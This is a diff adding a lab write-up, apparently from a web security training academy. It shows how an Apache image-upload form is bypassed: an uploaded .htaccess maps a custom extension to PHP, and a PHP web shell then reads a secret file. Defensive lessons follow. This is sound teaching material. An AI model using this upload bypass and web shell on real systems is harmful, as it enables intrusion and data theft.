@@ -1,0 +1,72 @@
+================================
+LAB: Web shell upload via extension blacklist bypass
+================================
+
+[LAB INFORMATION]
+-----------------
+Date: 2026-02-23
+Lab URL: https://0a3f00f903a09e5f813d4dde006d00dc.web-security-academy.net
+Category: File Upload Vulnerabilities
+Level: Practitioner
+Objective: Upload a PHP web shell and exfiltrate /home/carlos/secret
+Description: Image upload function blacklists PHP extensions, but the blacklist
+             can be bypassed due to a misconfiguration allowing .htaccess upload.
+
+[RECONNAISSANCE]
+----------------
+- Logged in as wiener:peter, navigated to /my-account
+- Upload function at POST /my-account/avatar accepts image files
+- Uploaded a legitimate PNG -> response: "The file avatars/dreamhouse-logo.png has been uploaded."
+- Uploaded files are served from /files/avatars/
+- Server header: Apache/2.4.41 (Ubuntu) -> Apache = .htaccess support confirmed
+
+[VULNERABILITY DISCOVERY]
+-------------------------
+- PHP extensions (.php, .php5, etc.) are blacklisted server-side
+- However, .htaccess is NOT blacklisted
+- Apache allows per-directory config override via .htaccess when AllowOverride is enabled
+- Uploading a custom .htaccess with AddType directive remaps any custom extension to PHP handler
+
+[EXPLOITATION]
+--------------
+Step 1 - Upload malicious .htaccess:
+  POST /my-account/avatar
+  filename=".htaccess"
+  Content-Type: text/plain
+  Body: AddType application/x-httpd-php .pwn
+
+  Response: "The file avatars/.htaccess has been uploaded."
+
+Step 2 - Upload PHP web shell with .pwn extension:
+  POST /my-account/avatar
+  filename="shell.pwn"
+  Content-Type: image/png
+  Body: <?php echo file_get_contents('/home/carlos/secret'); ?>
+
+  Response: "The file avatars/shell.pwn has been uploaded."
+
+Step 3 - Trigger execution:
+  GET /files/avatars/shell.pwn
+  -> Apache processes shell.pwn as PHP (per .htaccess directive)
+  -> PHP executes file_get_contents('/home/carlos/secret')
+
+[EVIDENCE]
+----------
+GET /files/avatars/shell.pwn HTTP/2
+Host: 0a3f00f903a09e5f813d4dde006d00dc.web-security-academy.net
+
+HTTP/2 200 OK
+Content-Type: text/html; charset=UTF-8
+Content-Length: 36
+
+T84mWeXKGCmCQD5X37n80FDlchAA5Rvs
+
+Secret submitted -> Lab solved.
+
+[LESSONS LEARNED]
+-----------------
+- A PHP extension blacklist is only as strong as what it also blocks: .htaccess must be denied
+- Apache AllowOverride should be set to None in upload directories
+- Upload directories should never be served with script execution enabled (use X-Content-Type-Options, serve as static only)
+- Always validate filename against a strict whitelist (allow only .jpg, .png, .gif) rather than a blacklist
+- Store uploaded files outside the webroot or on a separate domain to prevent execution entirely
